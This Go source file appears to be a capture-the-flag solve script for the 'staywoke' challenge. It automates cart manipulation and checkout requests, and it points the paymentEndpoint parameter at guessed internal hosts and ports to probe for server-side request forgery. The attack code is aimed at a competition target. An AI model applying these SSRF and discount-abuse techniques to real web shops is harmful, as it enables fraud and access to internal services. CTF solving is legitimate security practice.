package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
)

const base = "http://staywoke.hax1.allesctf.net"
const redeemCode = "I<3CORONA"
const account = "1337-420-69-93dcbbcd"

// index page - list of products
// product page - indexed incrementally, discover flag at position 1
// cart page - can POST numbers to delete items from cart
// checkout page - can use redeem codes to get 'discount'
// redeem API - send JSON, code field is used to compute response -> {"status": true|false}
// news API - gets array of text, set as textContent

// can be done by clicking - add products to the cart, apply discount, add flag, remove products and keep discount

// session=s%3A0_WOD0td8vc6vtnpJ2Z5ZLot3zIYU8gn.8wheEJQ7%2FCi0fgfN4BkkkdvtkxhhDhgHHHvL5d0VJPU
// %3A -> ":", %2F -> "/"
var hc = &http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

var hostports = map[string][]string{
	// "localhost":   []string{"8080"},
	"payment-api": []string{"9090"},
	// "redeem":    []string{"9090"},
	// "redeem-api": []string{"9090", "9091"},
	// "voucher-api": []string{"9091"},
	// "coupon":      []string{"9091"},
	// "coupon-api": []string{"9090"},
}

func main() {
	// redeem("")
	for host, ports := range hostports {
		for _, port := range ports {
			cookie := getCookie()
			addToCart("2", cookie)
			checkout("http://"+host+":"+port, cookie)
		}
	}
}

func addToCart(id, cookie string) {
	// flag has product id 1
	resp := post(base+"/products/"+id, "application/x-www-form-urlencoded", cookie, nil)
	defer resp.Body.Close()
	// dump(resp)
}

func redeem(cookie string) {
	values := map[string]string{
		"code":            redeemCode,
		"paymentEndpoint": "http://localhost:8080/api/redeem",
		"account":         "flagpls",
	}
	payload, err := json.Marshal(values)
	check(err)

	// also works with application/x-www-form-urlencoded
	resp := post(base+"/api/redeem", "application/json", cookie, bytes.NewBuffer(payload))
	defer resp.Body.Close()
	dump(resp)
}

var re = regexp.MustCompile("Error.*")

func checkout(apiURL, cookie string) {
	form := url.Values{}
	form.Add("payment", "w0kecoin")
	form.Add("account", account)
	form.Add("code", redeemCode)
	// form.Add("paymentEndpoint", base+"/api/redeem")
	// apparently this can't do DNS at all
	// localhost works, we need to guess the port number
	// 8080 connects to something but seems to only return HTML
	form.Add("paymentEndpoint", apiURL)

	resp := post(base+"/checkout", "application/x-www-form-urlencoded", cookie, strings.NewReader(form.Encode()))
	defer resp.Body.Close()
	dump, err := httputil.DumpResponse(resp, true)
	check(err)
	errors := re.FindAllString(string(dump), -1)
	for idx, msg := range errors {
		errors[idx] = html.UnescapeString(msg)
	}
	if len(errors) > 0 {
		fmt.Printf("%4s -> %s\n", apiURL, errors)
	} else {
		fmt.Printf("%s\n\n\n", dump)
	}
}

func getCookie() string {
	resp, err := http.Get(base)
	check(err)
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "session" {
			return cookie.Value
		}
	}
	return ""
}

func post(url, contentType, cookie string, body io.Reader) *http.Response {
	req, err := http.NewRequest("POST", url, body)
	check(err)
	req.Header.Set("Content-type", contentType)
	req.Header.Set("Cookie", "session="+cookie)
	resp, err := hc.Do(req)
	check(err)
	return resp
}

func dump(resp *http.Response) {
	dump, err := httputil.DumpResponse(resp, true)
	check(err)
	fmt.Printf("%s\n\n\n", dump)
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}
